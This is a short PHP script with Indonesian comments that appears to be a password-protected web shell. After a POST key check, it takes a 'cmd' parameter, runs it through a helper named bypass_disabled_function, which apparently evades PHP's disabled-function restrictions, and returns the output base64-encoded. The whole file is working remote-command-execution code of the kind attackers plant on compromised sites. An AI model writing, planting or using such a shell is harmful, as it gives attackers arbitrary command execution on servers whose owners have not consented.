<?php
include_once 'config.php';
include_once 'utils.php';
include_once 'logger.php';

// Verifikasi kunci akses
if (!isset($_POST['key']) || $_POST['key'] !== $access_key) {
    http_response_code(403);
    echo "Akses Ditolak!";
    log_access("Akses tidak sah mencoba masuk.", $_SERVER['REMOTE_ADDR']);
    exit;
}

$cmd = $_POST['cmd'] ?? '';
if ($cmd) {
    log_access("Perintah dijalankan: $cmd", $_SERVER['REMOTE_ADDR']);
    $output = bypass_disabled_function($cmd);
    echo base64_encode($output);
}
?>
